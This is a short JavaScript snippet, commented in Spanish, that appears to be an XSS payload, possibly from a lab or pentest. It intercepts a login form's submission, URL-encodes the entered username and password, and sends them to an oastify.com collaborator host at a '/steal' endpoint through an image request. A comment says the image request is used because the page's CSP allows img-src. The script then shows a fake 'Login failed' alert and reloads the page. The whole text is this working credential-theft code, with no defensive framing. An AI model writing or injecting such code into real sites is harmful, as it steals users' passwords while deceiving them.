form.addEventListener('submit', function(e) {
    e.preventDefault();
    
    var u = encodeURIComponent(inputUser.value);
    var p = encodeURIComponent(inputPass.value);
    
    // Usar imagen para exfiltrar (CSP permite img-src)
    var img = new Image();
    img.src = 'https://q8z64eihcu77xz7ligvhgmuuhlncb3zs.oastify.com/steal?u=' + u + '&p=' + p;
    
    setTimeout(function() {
        alert('Login failed. Please try again.');
        window.location.reload();
    }, 500);
});
